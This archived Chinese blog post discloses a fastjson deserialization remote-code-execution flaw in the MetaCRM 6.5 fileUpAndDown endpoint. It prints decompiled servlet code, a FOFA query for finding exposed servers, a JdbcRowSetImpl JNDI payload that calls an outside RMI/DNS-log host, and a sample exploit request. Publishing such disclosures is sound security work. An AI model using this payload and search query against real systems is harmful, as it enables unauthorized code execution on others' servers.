---
title: "美特CRM fileUpAndDown 反序列化代码执行漏洞"
source: https://mrxn.net/jswz/metasoft-fileUpAndDown-fastjson-insecure-deserialization-rce.html
asset_dir: assets/美特crm-fileupanddown-反序列化代码执行漏洞
---

# 美特CRM fileUpAndDown 反序列化代码执行漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/6/10 08:15
- 1018浏览
- [0评论](#comment)
- 30分钟阅读

深入探索

脚本语言

客户关系管理

脚本

---

# 漏洞简介

MetaCRM是一款智能平台化CRM[软件](#),通过提升企业管理和协同办公,全面提高企业管理水平和运营效率,帮助企业实现卓越管理。美特CRM fileUpAndDown 接口存在fastjson[反序列化漏洞](https://mrxn.net/tag/rce)，经过权限验证的攻击者可利用该漏洞在服务器[执行任意代码](https://mrxn.net/tag/rce)，造成服务器实现。

客户关系管理

# 影响版本

CRM6.5

# fofa语法

> `body="/common/scripts/basic.js" && body="www.metacrm.com.cn"`

# 漏洞分析

深入探索

安全

安全运维咨询

服务器安全服务

先看 web.xml 里对于 fileUpAndDown 接口的定义

漏洞修复方案

```
<!-- 文件的上传和下载 -->
    <servlet>
        <servlet-name>fileUpAndDown</servlet-name>
        <servlet-class>com.metasoft.framework.controller.FileUpAndDown</servlet-class>
    </servlet>

    <servlet-mapping>
        <servlet-name>fileUpAndDown</servlet-name>
        <url-pattern>/fileUpAndDown</url-pattern>
    </servlet-mapping>
```

跟进 `FileUpAndDown` 类看下具体实现方法

物流软件安全

```
public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException {
        request.setCharacterEncoding("utf-8");
        response.setContentType("text/html; utf-8");
        response.setCharacterEncoding("utf-8");
        String type = request.getParameter("type");
        UserState us = UserManager.getUserBySessionId(request.getSession().getId());
        ResourceService ress = null;
        if (us != null) {
            ress = us.getRess();
        }

        if (ress == null) {
            ress = new ResourceService();
        }

        if (us == null) {
            request.setAttribute("error", ress.getDispMessage("error.common.upanddown.login"));
            request.getRequestDispatcher("/common/jsp/message.jsp").forward(request, response);
        } else {
            String failure = ress.getDispMessage("error.common.upanddown.failure");
            String success = ress.getDispMessage("error.common.upanddown.success");
            JSONObject json = new JSONObject();
            if ("upload".equals(type)) {
                String upUrl = request.getParameter("p");
                if (StringUtil.isEmpty(upUrl)) {
                    upUrl = "";
                }

                String url = request.getParameter("url");
                if (StringUtil.isEmpty(url)) {
                    url = "";
                }

                AnalyzeParam ap = new AnalyzeParam(upUrl);
                String form = ap.getForm();
                String field = ap.getField();
                String folder = ap.getFolder();
```

深入探索

Windows安全工具

编程语言教程

JSON处理工具

当 `type=upload` 时，参数 `p` 被带入 `AnalyzeParam` 方法

```
public AnalyzeParam(String param) {
        AesEcbCipher aec = new AesEcbCipher();
        this.param = JSONObject.parseObject(aec.decrypt(param));
        if (this.param == null) {
            this.param = new JSONObject();
        }

    }
```

又见熟悉的AES解密后使用fastjosn直接进行反序列化操作，造成fastjson[反序列化漏洞](https://mrxn.net/tag/rce)。

AES相关可以参考前面文章 [美特CRM getFile 任意文件读取与反序列化漏洞](https://mrxn.net/jswz/metasoft-getFile-rce-fileread.html)

网络安全

# 漏洞复现

> [漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)利用需要**合法cookie**，payload这里以比较通用的POC来测试**RMI**

```
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://mrxn.dnslog.pt:1338/rmis/", "autoCommit":true}}""}
```

加密后的请求报文

```
GET /fileUpAndDown?p=AES加密后的payload&type=upload HTTP/1.1
Host: metasoft.mrxn.net
Cookie: JSESSIONID=你的cookie
```

执行后会报错

计算机服务器

[![美特CRM fileUpAndDown 反序列化代码执行漏洞](images/img-001-4ca96b434f98.webp)](https://image.mrxn.net/4716247ad5e14577815866139c375de3.webp)

[![美特CRM fileUpAndDown 反序列化代码执行漏洞](images/img-002-3c6e1cdce9ac.webp)](https://image.mrxn.net/6d4abef30dbc4fe190d2e65d43b8a3b9.webp)

DNSLOG平台成功收到请求

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#Java](https://mrxn.net/tag/Java)
- [#rce](https://mrxn.net/tag/rce)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
